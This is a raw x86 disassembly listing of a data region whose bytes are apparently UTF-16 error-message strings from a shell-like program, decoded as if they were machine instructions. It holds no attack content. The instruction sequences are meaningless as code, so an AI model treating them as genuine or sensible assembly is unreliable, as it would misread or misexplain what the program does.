  439340:	add    BYTE PTR gs:[eax+0x0],dh
  439344:	popa   
  439345:	add    BYTE PTR [edx+0x0],dh
  439348:	popa   
  439349:	add    BYTE PTR [eax+eax*1+0x6f],dh
  43934d:	add    BYTE PTR [edx+0x0],dh
  439350:	and    BYTE PTR [eax],al
  439352:	ins    DWORD PTR es:[edi],dx
  439353:	add    BYTE PTR [ecx+0x0],ch
  439356:	jae    0x439358
  439358:	jae    0x43935a
  43935a:	imul   eax,DWORD PTR [eax],0x67006e
  439360:	add    BYTE PTR [eax],al
  439362:	sub    eax,0x79007300
  439367:	add    BYTE PTR [esi+0x0],ch
  43936a:	je     0x43936c
  43936c:	popa   
  43936d:	add    BYTE PTR [eax+0x0],bh
  439370:	and    BYTE PTR [eax],al
  439372:	add    BYTE PTR gs:[edx+0x0],dh
  439376:	jb     0x439378
  439378:	outs   dx,DWORD PTR ds:[esi]
  439379:	add    BYTE PTR [edx+0x0],dh
  43937c:	and    BYTE PTR [eax],al
  43937e:	cmp    al,BYTE PTR [eax]
  439380:	and    BYTE PTR [eax],al
  439382:	add    BYTE PTR gs:[eax+0x0],bh
  439386:	jo     0x439388
  439388:	add    BYTE PTR gs:[ebx+0x0],ah
  43938c:	je     0x43938e
  43938e:	add    BYTE PTR gs:[eax+eax*1+0x20],ah
  439393:	add    BYTE PTR [edi],ah
  439395:	add    BYTE PTR [edx],bh
  439397:	add    BYTE PTR [edi],ah
  439399:	add    BYTE PTR [eax],ah
  43939b:	add    BYTE PTR [edi+0x0],ch
  43939e:	jb     0x4393a0
  4393a0:	and    BYTE PTR [eax],al
  4393a2:	daa    
  4393a3:	add    BYTE PTR ds:0x20002700,bh
  4393a9:	add    BYTE PTR [ebx+0x0],dh
  4393ac:	add    BYTE PTR gs:[eax+0x0],dh
  4393b0:	popa   
  4393b1:	add    BYTE PTR [edx+0x0],dh
  4393b4:	popa   
  4393b5:	add    BYTE PTR [eax+eax*1+0x6f],dh
  4393b9:	add    BYTE PTR [edx+0x0],dh
  4393bc:	add    BYTE PTR [eax],al
  4393be:	sub    eax,0x79007300
  4393c3:	add    BYTE PTR [esi+0x0],ch
  4393c6:	je     0x4393c8
  4393c8:	popa   
  4393c9:	add    BYTE PTR [eax+0x0],bh
  4393cc:	and    BYTE PTR [eax],al
  4393ce:	add    BYTE PTR gs:[edx+0x0],dh
  4393d2:	jb     0x4393d4
  4393d4:	outs   dx,DWORD PTR ds:[esi]
  4393d5:	add    BYTE PTR [edx+0x0],dh
  4393d8:	and    BYTE PTR [eax],al
  4393da:	cmp    al,BYTE PTR [eax]
  4393dc:	and    BYTE PTR [eax],al
  4393de:	je     0x4393e0
  4393e0:	outs   dx,DWORD PTR ds:[esi]
  4393e1:	add    BYTE PTR [edi+0x0],ch
  4393e4:	and    BYTE PTR [eax],al
  4393e6:	ins    DWORD PTR es:[edi],dx
  4393e7:	add    BYTE PTR [ecx+0x0],ah
  4393ea:	outs   dx,BYTE PTR ds:[esi]
  4393eb:	add    BYTE PTR [ecx+0x0],bh
  4393ee:	and    BYTE PTR [eax],al
  4393f0:	outs   dx,BYTE PTR ds:[esi]
  4393f1:	add    BYTE PTR [ecx+0x0],ah
  4393f4:	ins    DWORD PTR es:[edi],dx
  4393f5:	add    BYTE PTR [ebp+0x0],ah
  4393f8:	jae    0x4393fa
  4393fa:	and    BYTE PTR [eax],al
  4393fc:	je     0x4393fe
  4393fe:	outs   dx,DWORD PTR ds:[esi]
  4393ff:	add    BYTE PTR [eax],ah
  439401:	add    BYTE PTR [eax+eax*1+0x65],ch
  439405:	add    BYTE PTR [esi+0x0],ah
  439408:	je     0x43940a
  43940a:	and    BYTE PTR [eax],al
  43940c:	outs   dx,DWORD PTR ds:[esi]
  43940d:	add    BYTE PTR [esi+0x0],ah
  439410:	and    BYTE PTR [eax],al
  439412:	daa    
  439413:	add    BYTE PTR ds:0x2700,bh
  439419:	add    BYTE PTR [ebx],ah
  43941b:	add    BYTE PTR [ebx+0x0],dh
  43941e:	jns    0x439420
  439420:	outs   dx,BYTE PTR ds:[esi]
  439421:	add    BYTE PTR [eax+eax*1+0x61],dh
  439425:	add    BYTE PTR [eax+0x0],bh
  439428:	and    BYTE PTR [eax],al
  43942a:	add    BYTE PTR gs:[edx+0x0],dh
  43942e:	jb     0x439430
  439430:	outs   dx,DWORD PTR ds:[esi]
  439431:	add    BYTE PTR [edx+0x0],dh
  439434:	and    BYTE PTR [eax],al
  439436:	cmp    al,BYTE PTR [eax]
  439438:	and    BYTE PTR [eax],al
  43943a:	je     0x43943c
  43943c:	popa   
  43943d:	add    BYTE PTR [edx+0x0],dh
  439440:	add    BYTE PTR [di+0x0],ah
  439444:	je     0x439446
  439446:	and    BYTE PTR [eax],al
  439448:	outs   dx,BYTE PTR ds:[esi]
  439449:	add    BYTE PTR [ecx+0x0],ah
  43944c:	ins    DWORD PTR es:[edi],dx
  43944d:	add    BYTE PTR [ebp+0x0],ah
  439450:	and    BYTE PTR [eax],al
  439452:	ins    DWORD PTR es:[edi],dx
  439453:	add    BYTE PTR [ecx+0x0],ch
  439456:	jae    0x439458
  439458:	jae    0x43945a
  43945a:	imul   eax,DWORD PTR [eax],0x67006e
  439460:	add    BYTE PTR [eax],al
  439462:	pop    ss
  439463:	add    BYTE PTR [ecx+0x0],ch
  439466:	outs   dx,BYTE PTR ds:[esi]
  439467:	add    BYTE PTR [eax+eax*1+0x65],dh
  43946b:	add    BYTE PTR [edx+0x0],dh
  43946e:	outs   dx,BYTE PTR ds:[esi]
  43946f:	add    BYTE PTR [ecx+0x0],ah
  439472:	ins    BYTE PTR es:[edi],dx
  439473:	add    BYTE PTR [eax],ah
  439475:	add    BYTE PTR [ebp+0x0],ah
  439478:	jb     0x43947a
  43947a:	jb     0x43947c
  43947c:	outs   dx,DWORD PTR ds:[esi]
  43947d:	add    BYTE PTR [edx+0x0],dh
  439480:	and    BYTE PTR [eax],al
  439482:	cmp    al,BYTE PTR [eax]
  439484:	and    BYTE PTR [eax],al
  439486:	ins    BYTE PTR es:[edi],dx
  439487:	add    BYTE PTR [ebp+0x0],ah
  43948a:	js     0x43948c
  43948c:	add    BYTE PTR gs:[edx+0x0],dh
  439490:	add    BYTE PTR [eax],al
  439492:	sbb    BYTE PTR [eax],al
  439494:	imul   eax,DWORD PTR [eax],0x74006e
  43949a:	add    BYTE PTR gs:[edx+0x0],dh
  43949e:	outs   dx,BYTE PTR ds:[esi]
  43949f:	add    BYTE PTR [ecx+0x0],ah
  4394a2:	ins    BYTE PTR es:[edi],dx
  4394a3:	add    BYTE PTR [eax],ah
  4394a5:	add    BYTE PTR [ebp+0x0],ah
  4394a8:	jb     0x4394aa
  4394aa:	jb     0x4394ac
  4394ac:	outs   dx,DWORD PTR ds:[esi]
  4394ad:	add    BYTE PTR [edx+0x0],dh
  4394b0:	and    BYTE PTR [eax],al
  4394b2:	cmp    al,BYTE PTR [eax]
  4394b4:	and    BYTE PTR [eax],al
  4394b6:	jo     0x4394b8
  4394b8:	popa   
  4394b9:	add    BYTE PTR [edx+0x0],dh
  4394bc:	jae    0x4394be
  4394be:	add    BYTE PTR gs:[edx+0x0],dh
  4394c2:	add    BYTE PTR [eax],al
  4394c4:	and    DWORD PTR [eax],eax
  4394c6:	imul   eax,DWORD PTR [eax],0x74006e
  4394cc:	add    BYTE PTR gs:[edx+0x0],dh
  4394d0:	outs   dx,BYTE PTR ds:[esi]
  4394d1:	add    BYTE PTR [ecx+0x0],ah
  4394d4:	ins    BYTE PTR es:[edi],dx
  4394d5:	add    BYTE PTR [eax],ah
  4394d7:	add    BYTE PTR [ebp+0x0],ah
  4394da:	jb     0x4394dc
  4394dc:	jb     0x4394de
  4394de:	outs   dx,DWORD PTR ds:[esi]
  4394df:	add    BYTE PTR [edx+0x0],dh
  4394e2:	and    BYTE PTR [eax],al
  4394e4:	cmp    al,BYTE PTR [eax]
  4394e6:	and    BYTE PTR [eax],al
  4394e8:	ins    DWORD PTR es:[edi],dx
  4394e9:	add    BYTE PTR [ecx+0x0],ah
  4394ec:	arpl   WORD PTR [eax],ax
  4394ee:	jb     0x4394f0
  4394f0:	outs   dx,DWORD PTR ds:[esi]
  4394f1:	add    BYTE PTR [eax],ah
  4394f3:	add    BYTE PTR [ebp+0x0],ah
  4394f6:	js     0x4394f8
  4394f8:	jo     0x4394fa
  4394fa:	popa   
  4394fb:	add    BYTE PTR [esi+0x0],ch
  4394fe:	jae    0x439500
  439500:	imul   eax,DWORD PTR [eax],0x6e006f
  439506:	add    BYTE PTR [eax],al
  439508:	and    DWORD PTR [eax],eax
  43950a:	imul   eax,DWORD PTR [eax],0x74006e
  439510:	add    BYTE PTR gs:[edx+0x0],dh
  439514:	outs   dx,BYTE PTR ds:[esi]
  439515:	add    BYTE PTR [ecx+0x0],ah
  439518:	ins    BYTE PTR es:[edi],dx
  439519:	add    BYTE PTR [eax],ah
  43951b:	add    BYTE PTR [ebp+0x0],ah
  43951e:	jb     0x439520
  439520:	jb     0x439522
  439522:	outs   dx,DWORD PTR ds:[esi]
  439523:	add    BYTE PTR [edx+0x0],dh
  439526:	and    BYTE PTR [eax],al
  439528:	cmp    al,BYTE PTR [eax]
  43952a:	and    BYTE PTR [eax],al
  43952c:	je     0x43952e
  43952e:	popa   
  43952f:	add    BYTE PTR [edx+0x0],dh
  439532:	add    BYTE PTR [di+0x0],ah
  439536:	je     0x439538
  439538:	and    BYTE PTR [eax],al
  43953a:	bound  eax,QWORD PTR [eax]
  43953c:	jne    0x43953e
  43953e:	imul   eax,DWORD PTR [eax],0x64006c
  439544:	imul   eax,DWORD PTR [eax],0x67006e
  43954a:	add    BYTE PTR [eax],al
  43954c:	sub    eax,DWORD PTR [eax]
  43954e:	imul   eax,DWORD PTR [eax],0x74006e
  439554:	add    BYTE PTR gs:[edx+0x0],dh
  439558:	outs   dx,BYTE PTR ds:[esi]
  439559:	add    BYTE PTR [ecx+0x0],ah
  43955c:	ins    BYTE PTR es:[edi],dx
  43955d:	add    BYTE PTR [eax],ah
  43955f:	add    BYTE PTR [ebp+0x0],ah
  439562:	jb     0x439564
  439564:	jb     0x439566
  439566:	outs   dx,DWORD PTR ds:[esi]
  439567:	add    BYTE PTR [edx+0x0],dh
  43956a:	and    BYTE PTR [eax],al
  43956c:	cmp    al,BYTE PTR [eax]
  43956e:	and    BYTE PTR [eax],al
  439570:	add    BYTE PTR gs:[eax+0x0],bh
  439574:	jo     0x439576
  439576:	jb     0x439578
  439578:	add    BYTE PTR gs:[ebx+0x0],dh
  43957c:	jae    0x43957e
  43957e:	imul   eax,DWORD PTR [eax],0x6e006f
  439584:	and    BYTE PTR [eax],al
  439586:	jae    0x439588
  439588:	je     0x43958a
  43958a:	popa   
  43958b:	add    BYTE PTR [ebx+0x0],ah
  43958e:	imul   eax,DWORD PTR [eax],0x20
  439591:	add    BYTE PTR [edi+0x0],ch
  439594:	jbe    0x439596
  439596:	add    BYTE PTR gs:[edx+0x0],dh
  43959a:	data16 add BYTE PTR [eax+eax*1+0x6f],ch
  43959f:	add    BYTE PTR [edi+0x0],dh
  4395a2:	add    BYTE PTR [eax],al
  4395a4:	sub    al,BYTE PTR [eax]
  4395a6:	imul   eax,DWORD PTR [eax],0x74006e
  4395ac:	add    BYTE PTR gs:[edx+0x0],dh
  4395b0:	outs   dx,BYTE PTR ds:[esi]
  4395b1:	add    BYTE PTR [ecx+0x0],ah
  4395b4:	ins    BYTE PTR es:[edi],dx
  4395b5:	add    BYTE PTR [eax],ah
  4395b7:	add    BYTE PTR [ebp+0x0],ah
  4395ba:	jb     0x4395bc
  4395bc:	jb     0x4395be
  4395be:	outs   dx,DWORD PTR ds:[esi]
  4395bf:	add    BYTE PTR [edx+0x0],dh
  4395c2:	and    BYTE PTR [eax],al
  4395c4:	cmp    al,BYTE PTR [eax]
  4395c6:	and    BYTE PTR [eax],al
  4395c8:	je     0x4395ca
  4395ca:	add    BYTE PTR gs:[ebp+0x0],ch
  4395ce:	jo     0x4395d0
  4395d0:	and    BYTE PTR [eax],al
  4395d2:	data16 add BYTE PTR [ecx+0x0],ch
  4395d6:	ins    BYTE PTR es:[edi],dx
  4395d7:	add    BYTE PTR [ebp+0x0],ah
  4395da:	and    BYTE PTR [eax],al
  4395dc:	ins    BYTE PTR es:[edi],dx
  4395dd:	add    BYTE PTR [ecx+0x0],ch
  4395e0:	ins    DWORD PTR es:[edi],dx
  4395e1:	add    BYTE PTR [ecx+0x0],ch
  4395e4:	je     0x4395e6
  4395e6:	and    BYTE PTR [eax],al
  4395e8:	add    BYTE PTR gs:[eax+0x0],bh
  4395ec:	arpl   WORD PTR [eax],ax
  4395ee:	add    BYTE PTR gs:[ebp+0x0],ah
  4395f2:	add    BYTE PTR fs:[ebp+0x0],ah
  4395f6:	add    BYTE PTR fs:[eax],al
  4395f9:	add    BYTE PTR [eax],al
  4395fb:	add    BYTE PTR [edx],dl
  4395fd:	add    BYTE PTR [ebx+0x0],dh
  439600:	jo     0x439602
  439602:	popa   
  439603:	add    BYTE PTR [edi+0x0],dh
  439606:	outs   dx,BYTE PTR ds:[esi]
  439607:	add    BYTE PTR [eax],ah
  439609:	add    BYTE PTR [esi+0x0],ah
  43960c:	popa   
  43960d:	add    BYTE PTR [ecx+0x0],ch
  439610:	ins    BYTE PTR es:[edi],dx
  439611:	add    BYTE PTR [ebp+0x0],ah
  439614:	add    BYTE PTR fs:[eax],ah
  439617:	add    BYTE PTR [edx],bh
  439619:	add    BYTE PTR [eax],ah
  43961b:	add    BYTE PTR ds:0x7300,ah
  439621:	add    BYTE PTR [edi],ah
  439623:	add    BYTE PTR [ecx+0x0],ch
  439626:	outs   dx,BYTE PTR ds:[esi]
  439627:	add    BYTE PTR [eax+eax*1+0x65],dh
  43962b:	add    BYTE PTR [edx+0x0],dh
  43962e:	outs   dx,BYTE PTR ds:[esi]
  43962f:	add    BYTE PTR [ecx+0x0],ah
  439632:	ins    BYTE PTR es:[edi],dx
  439633:	add    BYTE PTR [eax],ah
  439635:	add    BYTE PTR [ebp+0x0],ah
  439638:	jb     0x43963a
  43963a:	jb     0x43963c
  43963c:	outs   dx,DWORD PTR ds:[esi]
  43963d:	add    BYTE PTR [edx+0x0],dh
  439640:	and    BYTE PTR [eax],al
  439642:	cmp    al,BYTE PTR [eax]
  439644:	and    BYTE PTR [eax],al
  439646:	outs   dx,DWORD PTR ds:[esi]
  439647:	add    BYTE PTR [ebp+0x0],dh
  43964a:	je     0x43964c
  43964c:	and    BYTE PTR [eax],al
  43964e:	outs   dx,DWORD PTR ds:[esi]
  43964f:	add    BYTE PTR [esi+0x0],ah
  439652:	and    BYTE PTR [eax],al
  439654:	jae    0x439656
  439656:	add    BYTE PTR gs:[ecx+0x0],ah
  43965a:	jb     0x43965c
  43965c:	arpl   WORD PTR [eax],ax
  43965e:	push   0x68002000
  439663:	add    BYTE PTR [ecx+0x0],ah
  439666:	outs   dx,BYTE PTR ds:[esi]
  439667:	add    BYTE PTR [eax+eax*1+0x6c],ah
  43966b:	add    BYTE PTR [ebp+0x0],ah
  43966e:	jae    0x439670
  439670:	add    BYTE PTR [eax],al
  439672:	daa    
  439673:	add    BYTE PTR [ecx+0x0],ah
  439676:	jb     0x439678
  439678:	add    BYTE PTR [di+0x0],dh
  43967c:	ins    DWORD PTR es:[edi],dx
  43967d:	add    BYTE PTR [ebp+0x0],ah
  439680:	outs   dx,BYTE PTR ds:[esi]
  439681:	add    BYTE PTR [eax+eax*1+0x20],dh
  439685:	add    BYTE PTR [edx+0x0],ah
  439688:	add    BYTE PTR gs:[esi+0x0],ah
  43968c:	outs   dx,DWORD PTR ds:[esi]
  43968d:	add    BYTE PTR [edx+0x0],dh
  439690:	add    BYTE PTR gs:[eax],ah
  439693:	add    BYTE PTR [edi],ah
  439695:	add    BYTE PTR [ecx],ch
  439697:	add    BYTE PTR [edi],ah
  439699:	add    BYTE PTR [eax],ah
  43969b:	add    BYTE PTR [ebp+0x0],ah
  43969e:	js     0x4396a0
  4396a0:	jo     0x4396a2
  4396a2:	popa   
  4396a3:	add    BYTE PTR [esi+0x0],ch
  4396a6:	add    BYTE PTR fs:[ebx+0x0],dh
  4396aa:	and    BYTE PTR [eax],al
  4396ac:	je     0x4396ae
  4396ae:	outs   dx,DWORD PTR ds:[esi]
  4396af:	add    BYTE PTR [eax],ah
  4396b1:	add    BYTE PTR [esi+0x0],ch
  4396b4:	outs   dx,DWORD PTR ds:[esi]
  4396b5:	add    BYTE PTR [eax+eax*1+0x68],dh
  4396b9:	add    BYTE PTR [ecx+0x0],ch
  4396bc:	outs   dx,BYTE PTR ds:[esi]
  4396bd:	add    BYTE PTR [edi+0x0],ah
  4396c0:	add    BYTE PTR [eax],al
  4396c2:	sbb    al,BYTE PTR [eax]
  4396c4:	arpl   WORD PTR [eax],ax
  4396c6:	popa   
  4396c7:	add    BYTE PTR [esi+0x0],ch
  4396ca:	outs   dx,BYTE PTR ds:[esi]
  4396cb:	add    BYTE PTR [edi+0x0],ch
  4396ce:	je     0x4396d0
  4396d0:	and    BYTE PTR [eax],al
  4396d2:	ja     0x4396d4
  4396d4:	jb     0x4396d6
  4396d6:	imul   eax,DWORD PTR [eax],0x650074
  4396dc:	and    BYTE PTR [eax],al
  4396de:	je     0x4396e0
  4396e0:	outs   dx,DWORD PTR ds:[esi]
  4396e1:	add    BYTE PTR [eax],ah
  4396e3:	add    BYTE PTR [esi+0x0],ah
  4396e6:	imul   eax,DWORD PTR [eax],0x65006c
  4396ec:	and    BYTE PTR [eax],al
  4396ee:	daa    
  4396ef:	add    BYTE PTR ds:0x27007300,ah
  4396f5:	add    BYTE PTR [eax],al
  4396f7:	add    BYTE PTR [esi],ch
  4396f9:	add    BYTE PTR [ebp+0x0],ch
  4396fc:	popa   
  4396fd:	add    BYTE PTR [ebx+0x0],ah
  439700:	jb     0x439702
  439702:	outs   dx,DWORD PTR ds:[esi]
  439703:	add    BYTE PTR [eax],ah
  439705:	add    BYTE PTR [edi+0x0],ch
  439708:	jb     0x43970a
  43970a:	and    BYTE PTR [eax],al
  43970c:	imul   eax,DWORD PTR [eax],0x6c006e
  439712:	imul   eax,DWORD PTR [eax],0x65006e
  439718:	and    BYTE PTR [eax],al
  43971a:	data16 add BYTE PTR [ecx+0x0],ch
  43971e:	ins    BYTE PTR es:[edi],dx
  43971f:	add    BYTE PTR [ebp+0x0],ah
  439722:	and    BYTE PTR [eax],al
  439724:	je     0x439726
  439726:	outs   dx,DWORD PTR ds:[esi]
  439727:	add    BYTE PTR [edi+0x0],ch
  43972a:	and    BYTE PTR [eax],al
  43972c:	ins    BYTE PTR es:[edi],dx
  43972d:	add    BYTE PTR [edi+0x0],ch
  439730:	outs   dx,BYTE PTR ds:[esi]
  439731:	add    BYTE PTR [edi+0x0],ah
  439734:	and    BYTE PTR [eax],al
  439736:	sub    BYTE PTR [eax],al
  439738:	ins    DWORD PTR es:[edi],dx
  439739:	add    BYTE PTR [ecx+0x0],ah
  43973c:	js     0x43973e
  43973e:	imul   eax,DWORD PTR [eax],0x75006d
  439744:	ins    DWORD PTR es:[edi],dx
  439745:	add    BYTE PTR [eax],ah
  439747:	add    BYTE PTR [edx],bh
  439749:	add    BYTE PTR [eax],ah
  43974b:	add    BYTE PTR [esi],dh
  43974d:	add    BYTE PTR [eax+eax*1],dh
  439750:	dec    ebx
  439751:	add    BYTE PTR [ecx],ch
  439753:	add    BYTE PTR [eax],al
  439755:	add    BYTE PTR [ebx],al
  439757:	add    BYTE PTR ds:0x7300,ah
  43975d:	add    BYTE PTR [esi],cl
  43975f:	add    BYTE PTR [edi+0x0],ch
  439762:	jne    0x439764
  439764:	je     0x439766
  439766:	and    BYTE PTR [eax],al
  439768:	outs   dx,DWORD PTR ds:[esi]
  439769:	add    BYTE PTR [esi+0x0],ah
  43976c:	and    BYTE PTR [eax],al
  43976e:	ins    DWORD PTR es:[edi],dx
  43976f:	add    BYTE PTR [ebp+0x0],ah
  439772:	ins    DWORD PTR es:[edi],dx
  439773:	add    BYTE PTR [edi+0x0],ch
  439776:	jb     0x439778
  439778:	jns    0x43977a
  43977a:	add    BYTE PTR [eax],al
  43977c:	adc    al,0x0
  43977e:	data16 add BYTE PTR [ecx+0x0],ch
  439782:	ins    BYTE PTR es:[edi],dx
  439783:	add    BYTE PTR [ebp+0x0],ah
  439786:	and    BYTE PTR [eax],al
  439788:	daa    
  439789:	add    BYTE PTR ds:0x27007300,ah
  43978f:	add    BYTE PTR [eax],ah
  439791:	add    BYTE PTR [esi+0x0],ch
  439794:	outs   dx,DWORD PTR ds:[esi]
  439795:	add    BYTE PTR [eax+eax*1+0x20],dh
  439799:	add    BYTE PTR [esi+0x0],ah
  43979c:	outs   dx,DWORD PTR ds:[esi]
  43979d:	add    BYTE PTR [ebp+0x0],dh
  4397a0:	outs   dx,BYTE PTR ds:[esi]
  4397a1:	add    BYTE PTR [eax+eax*1+0x0],ah
  4397a5:	add    BYTE PTR ds:0x69006600,dl
  4397ab:	add    BYTE PTR [eax+eax*1+0x65],ch
  4397af:	add    BYTE PTR [eax],ah
  4397b1:	add    BYTE PTR [edi],ah
  4397b3:	add    BYTE PTR ds:0x27007300,ah
  4397b9:	add    BYTE PTR [eax],ah
  4397bb:	add    BYTE PTR [ebp+0x0],dh
  4397be:	outs   dx,BYTE PTR ds:[esi]
  4397bf:	add    BYTE PTR [edx+0x0],dh
  4397c2:	add    BYTE PTR gs:[ecx+0x0],ah
  4397c6:	add    BYTE PTR fs:[ecx+0x0],ah
  4397ca:	bound  eax,QWORD PTR [eax]
  4397cc:	ins    BYTE PTR es:[edi],dx
  4397cd:	add    BYTE PTR [ebp+0x0],ah
  4397d0:	add    BYTE PTR [eax],al
  4397d2:	pop    ds
  4397d3:	add    BYTE PTR [ebx+0x0],ah
  4397d6:	popa   
  4397d7:	add    BYTE PTR [esi+0x0],ch
  4397da:	outs   dx,BYTE PTR ds:[esi]
  4397db:	add    BYTE PTR [edi+0x0],ch
  4397de:	je     0x4397e0
  4397e0:	and    BYTE PTR [eax],al
  4397e2:	arpl   WORD PTR [eax],ax
  4397e4:	jb     0x4397e6
  4397e6:	add    BYTE PTR gs:[ecx+0x0],ah
  4397ea:	je     0x4397ec
  4397ec:	add    BYTE PTR gs:[eax],ah
  4397ef:	add    BYTE PTR [ecx+0x0],ch
  4397f2:	outs   dx,BYTE PTR ds:[esi]
  4397f3:	add    BYTE PTR [eax+eax*1+0x69],ch
  4397f7:	add    BYTE PTR [esi+0x0],ch
  4397fa:	add    BYTE PTR gs:[eax],ah
  4397fd:	add    BYTE PTR [esi+0x0],ah
  439800:	imul   eax,DWORD PTR [eax],0x65006c
  439806:	and    BYTE PTR [eax],al
  439808:	daa    
  439809:	add    BYTE PTR ds:0x27007300,ah
  43980f:	add    BYTE PTR [eax],al
  439811:	add    BYTE PTR [ecx],bl
  439813:	add    BYTE PTR [edi+0x0],ch
  439816:	jne    0x439818
  439818:	je     0x43981a
  43981a:	and    BYTE PTR [eax],al
  43981c:	outs   dx,DWORD PTR ds:[esi]
  43981d:	add    BYTE PTR [esi+0x0],ah
  439820:	and    BYTE PTR [eax],al
  439822:	add    BYTE PTR gs:[esi+0x0],ch
  439826:	jbe    0x439828
  439828:	imul   eax,DWORD PTR [eax],0x6f0072
  43982e:	outs   dx,BYTE PTR ds:[esi]
  43982f:	add    BYTE PTR [ebp+0x0],ch
  439832:	add    BYTE PTR gs:[esi+0x0],ch
  439836:	je     0x439838
  439838:	and    BYTE PTR [eax],al
  43983a:	jae    0x43983c
  43983c:	jo     0x43983e
  43983e:	popa   
  43983f:	add    BYTE PTR [ebx+0x0],ah
  439842:	add    BYTE PTR gs:[eax],al
  439845:	add    BYTE PTR [eax+0x41],dl
  439848:	push   ds
  439849:	add    BYTE PTR [ebx+0x0],ah
  43984c:	popa   
  43984d:	add    BYTE PTR [esi+0x0],ch
  439850:	outs   dx,BYTE PTR ds:[esi]
  439851:	add    BYTE PTR [edi+0x0],ch
  439854:	je     0x439856
  439856:	and    BYTE PTR [eax],al
  439858:	data16 add BYTE PTR [ecx+0x0],ch
  43985c:	outs   dx,BYTE PTR ds:[esi]
  43985d:	add    BYTE PTR [eax+eax*1+0x20],ah
  439861:	add    BYTE PTR [ebx+0x0],ah
  439864:	outs   dx,DWORD PTR ds:[esi]
  439865:	add    BYTE PTR [ebp+0x0],ch
  439868:	ins    DWORD PTR es:[edi],dx
  439869:	add    BYTE PTR [ecx+0x0],ah
  43986c:	outs   dx,BYTE PTR ds:[esi]
  43986d:	add    BYTE PTR [eax+eax*1+0x20],ah
  439871:	add    BYTE PTR [eax+0x0],dh
  439874:	jb     0x439876
  439876:	outs   dx,DWORD PTR ds:[esi]
  439877:	add    BYTE PTR [ebx+0x0],ah
  43987a:	add    BYTE PTR gs:[ebx+0x0],dh
  43987e:	jae    0x439880
  439880:	outs   dx,DWORD PTR ds:[esi]
  439881:	add    BYTE PTR [edx+0x0],dh
  439884:	add    BYTE PTR [eax],al
  439886:	and    al,BYTE PTR [eax]
  439888:	arpl   WORD PTR [eax],ax
  43988a:	popa   
  43988b:	add    BYTE PTR [esi+0x0],ch
  43988e:	outs   dx,BYTE PTR ds:[esi]
  43988f:	add    BYTE PTR [edi+0x0],ch
  439892:	je     0x439894
  439894:	and    BYTE PTR [eax],al
  439896:	add    BYTE PTR fs:[ebp+0x0],ah
  43989a:	ins    BYTE PTR es:[edi],dx
  43989b:	add    BYTE PTR [ebp+0x0],ah
  43989e:	je     0x4398a0
  4398a0:	add    BYTE PTR gs:[eax],ah
  4398a3:	add    BYTE PTR [eax+eax*1+0x65],dh
  4398a7:	add    BYTE PTR [ebp+0x0],ch
  4398aa:	jo     0x4398ac
  4398ac:	outs   dx,DWORD PTR ds:[esi]
  4398ad:	add    BYTE PTR [edx+0x0],dh
  4398b0:	popa   
  4398b1:	add    BYTE PTR [edx+0x0],dh
  4398b4:	jns    0x4398b6
  4398b6:	and    BYTE PTR [eax],al
  4398b8:	data16 add BYTE PTR [ecx+0x0],ch
  4398bc:	ins    BYTE PTR es:[edi],dx
  4398bd:	add    BYTE PTR [ebp+0x0],ah
  4398c0:	and    BYTE PTR [eax],al
  4398c2:	daa    
  4398c3:	add    BYTE PTR ds:0x27007300,ah
  4398c9:	add    BYTE PTR [eax],al
  4398cb:	add    BYTE PTR [ebx],dl
  4398cd:	add    BYTE PTR [eax+eax*1+0x65],dh
  4398d1:	add    BYTE PTR [edx+0x0],dh
  4398d4:	ins    DWORD PTR es:[edi],dx
  4398d5:	add    BYTE PTR [ecx+0x0],ch
  4398d8:	outs   dx,BYTE PTR ds:[esi]
  4398d9:	add    BYTE PTR [ecx+0x0],ah
  4398dc:	je     0x4398de
  4398de:	add    BYTE PTR gs:[eax+eax*1+0x20],ah
  4398e3:	add    BYTE PTR [edx+0x0],ah
  4398e6:	jns    0x4398e8
  4398e8:	and    BYTE PTR [eax],al
  4398ea:	jne    0x4398ec
  4398ec:	jae    0x4398ee
  4398ee:	add    BYTE PTR gs:[edx+0x0],dh
  4398f2:	add    BYTE PTR [eax],al
  4398f4:	sub    BYTE PTR [eax],al
  4398f6:	jae    0x4398f8
  4398f8:	jns    0x4398fa
  4398fa:	outs   dx,BYTE PTR ds:[esi]
  4398fb:	add    BYTE PTR [eax+eax*1+0x61],dh
  4398ff:	add    BYTE PTR [eax+0x0],bh
  439902:	and    BYTE PTR [eax],al
  439904:	add    BYTE PTR gs:[edx+0x0],dh
  439908:	jb     0x43990a
  43990a:	outs   dx,DWORD PTR ds:[esi]
  43990b:	add    BYTE PTR [edx+0x0],dh
  43990e:	and    BYTE PTR [eax],al
  439910:	cmp    al,BYTE PTR [eax]
  439912:	and    BYTE PTR [eax],al
  439914:	daa    
  439915:	add    BYTE PTR [ebp+0x0],bh
  439918:	daa    
  439919:	add    BYTE PTR [eax],ah
  43991b:	add    BYTE PTR [ebp+0x0],ch
  43991e:	imul   eax,DWORD PTR [eax],0x730073
  439924:	imul   eax,DWORD PTR [eax],0x67006e
  43992a:	and    BYTE PTR [eax],al
  43992c:	imul   eax,DWORD PTR [eax],0x20006e
  439932:	add    BYTE PTR fs:[ebp+0x0],ah
  439936:	jo     0x439938
  439938:	add    BYTE PTR gs:[esi+0x0],ch
  43993c:	add    BYTE PTR fs:[ebp+0x0],ah
  439940:	outs   dx,BYTE PTR ds:[esi]
  439941:	add    BYTE PTR [eax+eax*1+0x0],dh
  439945:	add    BYTE PTR [eax+eax*1],bl
  439948:	jne    0x43994a
  43994a:	outs   dx,BYTE PTR ds:[esi]
  43994b:	add    BYTE PTR [ecx+0x0],ah
  43994e:	bound  eax,QWORD PTR [eax]
  439950:	ins    BYTE PTR es:[edi],dx
  439951:	add    BYTE PTR [ebp+0x0],ah
  439954:	and    BYTE PTR [eax],al
  439956:	je     0x439958
  439958:	outs   dx,DWORD PTR ds:[esi]
  439959:	add    BYTE PTR [eax],ah
  43995b:	add    BYTE PTR [ebx+0x0],ah
  43995e:	ins    BYTE PTR es:[edi],dx
  43995f:	add    BYTE PTR [edi+0x0],ch
  439962:	jae    0x439964
  439964:	add    BYTE PTR gs:[eax],ah
  439967:	add    BYTE PTR [esi+0x0],ah
  43996a:	imul   eax,DWORD PTR [eax],0x65006c
  439970:	and    BYTE PTR [eax],al
  439972:	cmp    al,BYTE PTR [eax]
  439974:	and    BYTE PTR [eax],al
  439976:	daa    
  439977:	add    BYTE PTR ds:0x27007300,ah
  43997d:	add    BYTE PTR [eax],al
  43997f:	add    BYTE PTR [esi],bl
  439981:	add    BYTE PTR [edi],ch
  439983:	add    BYTE PTR [esi+0x0],al
  439986:	and    BYTE PTR [eax],al
  439988:	outs   dx,DWORD PTR ds:[esi]
